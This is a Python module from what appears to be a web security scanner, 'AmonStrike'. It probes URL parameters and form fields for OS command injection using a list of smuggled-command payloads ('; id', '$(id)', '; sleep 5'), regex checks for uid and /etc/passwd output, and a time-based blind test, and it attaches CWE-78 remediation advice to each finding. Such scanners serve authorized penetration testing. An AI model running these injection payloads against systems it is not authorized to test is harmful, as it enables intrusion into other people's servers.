"""AmonStrike — OS Command Injection Module"""
import re, time
from .base import BaseModule

CMD_PAYLOADS = [
    "; id", "& id", "| id", "`id`", "$(id)",
    "; whoami", "& whoami", "| whoami",
    "; sleep 5", "& sleep 5", "| sleep 5",
    "; ping -c1 127.0.0.1", "| ping -c1 127.0.0.1",
    "%0aid", "%0a id", "%0a%0aid",
    "||id", "&&id", ";id;",
    "|id #", ";id #", "& id #",
]

CMD_PARAMS = [
    "cmd","command","exec","run","ping","host","ip","addr",
    "domain","target","url","file","path","name","input","q",
    "search","from","to","subject","text","data","process",
]

CMD_SIGNATURES = ["uid=","root:","www-data","nobody","daemon","PING"]
CMD_REAL_PATTERNS = [
    r"uid=\d+\(",      # uid=33(www-data) — real output
    r"root:x:\d+",      # root:x:0:0 — /etc/passwd
    r"\d+ bytes from",  # ping output
    r"PING .* \d+ bytes",
]

class CommandInjectionModule(BaseModule):
    NAME        = "command_injection"
    DESCRIPTION = "OS command injection — dedicated module, time-based blind"

    def _is_real_rce(self, response_text: str, baseline_text: str) -> bool:
        """Verify RCE - must show actual command output, not just HTML containing uid=."""
        import re
        # Real RCE patterns - not just substrings
        real_patterns = [
            r"uid=\d+\(\w+\)",       # uid=33(www-data)
            r"root:x:\d+:\d+:",         # /etc/passwd line
            r"\d+ bytes from \d+\.\d+\.\d+\.\d+",  # ping
            r"Linux .* \#\d+",          # uname output
            r"total \d+\ndrwx",         # ls output
        ]
        for pat in real_patterns:
            if re.search(pat, response_text):
                # Also verify it's NOT in the baseline
                if not re.search(pat, baseline_text):
                    return True
        return False

    def run(self):
        self.log("Testing OS command injection...")
        self._test_url_params()
        self._test_forms()
        self._test_blind_time()
        self.log(f"Cmd injection complete — {len(self.findings)} findings", "+")
        return self.result()

    def _test_url_params(self):
        # Get baseline to detect false positives
        r0 = self.get("")
        baseline_text = r0.text if r0 else ""
        self._baseline = baseline_text
        for param in CMD_PARAMS:
            for payload in CMD_PAYLOADS[:10]:
                r = self.get(params={param: f"test{payload}"})
                if r and self._is_real_rce(r.text, baseline_text):
                    match = next(s for s in CMD_SIGNATURES if s in r.text)
                    self.add_finding(
                        title       = f"OS Command Injection — Parameter \'{param}\'",
                        severity    = "CRITICAL",
                        description = (
                            f"OS command injection confirmed via parameter \'{param}\'. "
                            f"Payload \'{payload}\' executed on server."
                        ),
                        evidence    = f"Param: {param}\nPayload: {payload}\nSignature: {match}\nOutput: {r.text[:300]}",
                        remediation = "Never pass user input to shell functions. Use subprocess with args list (no shell=True).",
                        url=self.url, parameter=param, payload=payload, cve="CWE-78",
                    )
                    return

    def _test_forms(self):
        r0 = self.get("")
        if not r0: return
        for form in self.extract_forms(r0):
            for field in form.get("inputs",{}):
                for payload in ["; id", "| id"]:
                    data = dict(form["inputs"]); data[field] = f"test{payload}"
                    r = self.post(form.get("action",""), data=data)
                    if r and self._is_real_rce(r.text, getattr(self,"_baseline","")):
                        self.add_finding(
                            title       = f"OS Command Injection via Form Field \'{field}\'",
                            severity    = "CRITICAL",
                            description = f"Command injection in form field \'{field}\'.",
                            evidence    = f"Field: {field}\nPayload: {payload}\nOutput: {r.text[:200]}",
                            remediation = "Validate all form inputs. Never use shell=True.",
                            url=self.url, parameter=field, payload=payload, cve="CWE-78",
                        )
                        return

    def _test_blind_time(self):
        """Time-based blind command injection."""
        for param in CMD_PARAMS[:5]:
            t0 = time.time()
            self.get(params={param: "test; sleep 5"})
            elapsed = time.time() - t0
            if elapsed >= 4.5:
                self.add_finding(
                    title       = f"Blind OS Command Injection (Time-based) — \'{param}\'",
                    severity    = "CRITICAL",
                    description = f"5s sleep injected via \'{param}\' caused {elapsed:.1f}s delay.",
                    evidence    = f"Payload: ; sleep 5\nDelay: {elapsed:.1f}s",
                    remediation = "Do not pass user input to shell. Use parameterized subprocess calls.",
                    url=self.url, parameter=param, payload="; sleep 5", cve="CWE-78",
                )
                break
